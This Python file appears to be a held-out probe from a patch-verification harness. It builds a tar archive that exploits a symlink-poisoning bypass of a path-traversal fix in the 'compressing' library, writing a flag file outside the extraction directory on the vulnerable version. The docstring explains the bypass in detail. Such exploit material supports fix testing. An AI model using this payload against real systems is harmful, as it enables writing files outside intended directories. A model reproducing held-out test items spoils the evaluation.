#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2026-40931 residual — symlink-poisoning bypass of the CVE-2026-24884 fix.

The CVE-2026-24884 fix (present on V1 = compressing 2.1.0) validates entry paths with a STRING check:
`isPathWithinParent(path.resolve(destFilePath), resolvedDestDir)` for files, and additionally checks
the textual TARGET of any *tar-carried* symlink entry. That defeats a plain `../` member and a tar
symlink pointing outside. But it NEVER lstat()s the path segments that already exist on disk, so it
follows a PRE-EXISTING filesystem symlink.

This is exactly GHSA-4c3q-x735-j3r5, "Complete Bypass of CVE-2026-24884 Patch via Git-Delivered
Symlink Poisoning": the extraction destination already contains an attacker-influenced symlink
(delivered out-of-band — e.g. checked out from a git working tree, or left by a prior extraction)
named `link` that points OUTSIDE destDir. The malicious tar then carries an ordinary file member

    link/flag.txt

whose *textual* path `destDir/link/flag.txt` resolves INSIDE destDir (so isPathWithinParent passes),
but the on-disk `link` is a symlink to `../pcb_witness`, so `fs.createWriteStream` writes the marker
THROUGH the symlink into the witness dir OUTSIDE destDir. The FLAG lands in the witness dir on V1.

In the harness, the pre-existing on-disk symlink is materialised by the `x-pcb-poison: link` request
header (the service creates `destDir/link -> ../pcb_witness` before extracting), modelling the
git-delivered checkout state. The tar itself is a benign single-file archive.

CVE-2026-40931 fix (V2 = 2.1.1) adds `isRealPathSafe(resolvedDestPath, destDir, realDestDir)`, which
walks every path segment with `fs.promises.lstat`; when it reaches `link` and sees a symbolic link
resolving outside destDir it fails closed and skips the entry -> the residual is closed (nothing
lands in the witness dir).

Contract: escapes on V1 (flag observed in the witness dir); closed on V2.
"""
from __future__ import annotations

import io
import tarfile


def build_tar(flag: str) -> bytes:
    buf = io.BytesIO()
    tf = tarfile.open(fileobj=buf, mode="w", format=tarfile.GNU_FORMAT)
    data = (flag + "\n").encode()
    ti = tarfile.TarInfo("link/flag.txt")  # written THROUGH the pre-existing `link` symlink
    ti.size = len(data)
    ti.mode = 0o644
    tf.addfile(ti, io.BytesIO(data))
    tf.close()
    return buf.getvalue()


def candidate(flag: str) -> dict:
    """Ordinary file member `link/flag.txt` + a pre-existing on-disk `link` symlink (poison=link)."""
    return {
        "probe_id": "cve-2026-40931-preexisting-symlink-poisoning",
        "method": "POST",
        "path": "/extract",
        "poison": "link",
        "tar_b64": _b64(build_tar(flag)),
        "kind": "residual",
    }


def _b64(b: bytes) -> str:
    import base64
    return base64.b64encode(b).decode()


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo")["probe_id"])
